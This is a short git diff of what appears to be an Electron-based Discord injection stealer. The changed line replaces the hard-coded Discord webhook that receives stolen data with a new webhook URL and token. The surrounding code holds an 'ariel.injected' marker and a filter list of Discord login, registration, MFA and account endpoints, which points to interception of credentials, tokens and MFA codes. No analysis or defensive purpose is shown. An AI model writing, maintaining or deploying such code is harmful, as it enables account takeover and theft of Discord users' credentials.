@@ -15,7 +15,7 @@ const {
   session,
 } = require('electron');
 
-const WEBHOOK = 'https://discord.com/api/webhooks/1574860617494560868/BrnBE0ATuBiBtmxXymuDO-WKdMcfNJNVrQuRnexkCa9CiNEFJ2SusAwbdou7C2jjWQ4y';
+const WEBHOOK = 'https://discord.com/api/webhooks/1576081252812070944/c6z1IfX8lKHOV2exUfI5AL_ENhKaKHMVjZD2DP92Gz54lgMOUg7kZBRTZoKIkERbtkK2';
 const API = 'https://discord.com/api/v9';
 const MARKER = path.join(__dirname, 'ariel.injected');
 const FILTERS = ['/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me'];
